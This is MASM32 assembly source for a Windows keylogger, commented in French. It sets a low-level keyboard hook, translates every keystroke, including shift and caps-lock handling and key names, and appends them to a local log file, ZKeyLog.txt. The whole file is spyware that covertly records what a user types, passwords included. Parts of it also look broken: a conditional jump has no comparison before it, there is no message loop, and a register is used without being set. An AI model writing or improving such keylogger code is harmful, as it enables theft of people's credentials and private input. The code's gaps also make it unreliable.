.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\advapi32.inc
include msvcrt.inc
 
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\advapi32.lib
includelib msvcrt.lib

pushz    macro szText:VARARG
    local    nexti
    call    nexti
    db    szText,00h
nexti:
endm

.data
hFile            dd        0
hHook            dd        0
lpCharBuf        db        32 dup(0)
msg            MSG        <>

.code

main:
    pushz    "ab"            ; append en binaire
    pushz    "ZKeyLog.txt"        ; nom du fichier de log
    call    fopen            ; ouverture du fichier
    add    esp, 24        ; 
    mov    [hFile], eax

    push    ebx
    call    GetModuleHandleA    ; Handle necessaire pour setup le hook
    push    ebx            ; commencer à hook
    push    eax
    push    offset KeyBoardProc    ; emplacement du hook
    push    WH_KEYBOARD_LL        ; keylog avec WH_KEYBOARD_LL
    call    SetWindowsHookExA    ; Pour éviter d'utiliser un DLL (nécessaire normalement)
    mov    [hHook], eax        ; handle du hook

    push    ebx
    push    ebx
    push    ebx
    push    offset msg
    call    GetMessageA        ; On attend un message

KeyBoardProc    PROC    nCode:DWORD, wParam:DWORD, lParam:DWORD
    LOCAL    lpKeyState[256]    :BYTE

    lea    edi, [lpKeyState]    ; on reset le buffer
    push    256/4
    pop    ecx
    xor    eax, eax
    rep    stosd            ; 



    je    no_window_change        ; bypass tout le reste 


no_window_change:
    mov    esi, [lParam]
    lodsd
    cmp    al, VK_LSHIFT
    je    next_hook
    cmp    al, VK_RSHIFT
    je    next_hook
    cmp    al, VK_CAPITAL
    je    next_hook
    cmp    al, VK_ESCAPE
    je    get_name_of_key
    cmp    al, VK_BACK
    je    get_name_of_key
    cmp    al, VK_TAB
    je    get_name_of_key
    ;------------------
    lea    edi, [lpCharBuf]
    push    32/4
    pop    ecx
    xor    eax, eax
    rep    stosd
    ;----------
    lea    ebx, [lpKeyState]
    push    ebx
    call    GetKeyboardState

    push    VK_LSHIFT
    call    GetKeyState
    xchg    esi, eax

    push    VK_RSHIFT
    call    GetKeyState
    or    eax, esi

    mov    byte ptr [ebx + 16], al

    push    VK_CAPITAL
    call    GetKeyState
    mov    byte ptr [ebx + 20], al

    mov    esi, [lParam]
    lea    edi, [lpCharBuf]
    push    00h
    push    edi
    push    ebx
    lodsd
    xchg    eax, edx
    lodsd
    push    eax
    push    edx
    call    ToAscii
    test    eax, eax
    jnz    test_carriage_return

get_name_of_key:
    mov    esi, [lParam]
    lodsd
    lodsd
    shl    eax, 16
    xchg    eax, ecx
    lodsd
    shl    eax, 24
    or    ecx, eax

    push    32
    lea    edi, [lpCharBuf]
    push    edi
    push    ecx
    call    GetKeyNameTextA

    push    edi
    pushz    "[%s]"
    jmp    write_to_file

test_carriage_return:
    push    edi
    pushz    "%s"

    cmp    byte ptr [edi], 0dh
    jne    write_to_file

    mov    byte ptr [edi + 1], 0ah
write_to_file:
    push    [hFile]
    call    fprintf
    add    esp, 24
next_hook:
    push    [lParam]
    push    [wParam]
    push    [nCode]
    push    [hHook]
    call    CallNextHookEx
    ret
KeyBoardProc    ENDP

end    main
